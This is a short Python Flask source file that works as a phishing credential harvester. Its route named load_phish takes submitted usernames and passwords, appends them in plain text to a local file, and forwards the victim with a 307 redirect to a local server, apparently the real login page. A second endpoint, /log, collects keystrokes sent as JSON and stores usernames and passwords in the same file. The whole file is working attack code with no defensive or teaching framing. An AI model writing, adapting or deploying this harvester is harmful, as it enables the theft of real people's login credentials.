from flask import Flask, redirect, render_template, request, jsonify
import logging

def extract_credentials(query_string):
    parsed_data = {}
    for pair in query_string.split('&'):
        key, value = pair.split('=', 1)
        parsed_data[key] = value
    
    username = parsed_data.get("username")
    password = parsed_data.get("password")
    return username, password


app = Flask(__name__)

@app.route("/", methods=["POST", "GET"])
def load_phish():
    print('refreshed')
    if request.method == "POST":
        text = request.get_data(as_text=True)
        username, password = extract_credentials(text)
        with open("user_info.txt", "a+") as file:
            file.write(f"{username},{password}\n")
        return redirect("http://127.0.0.1:8080/", 307)
    
    return render_template("main.html")

@app.route('/log', methods=['POST', 'OPTIONS'])
def log_keystrokes():
    if request.method == "POST":
        data = request.get_json()
        print(data)
        
        if "username" in data:
            with open("user_info.txt", "a+") as file:
                file.write(f"username:{data['username']}\n")
                
        if "password" in data:
            with open("user_info.txt", "a+") as file:
                file.write(f"password:{data['password']}\n")

        return jsonify({"status": "success", "received": data}), 200
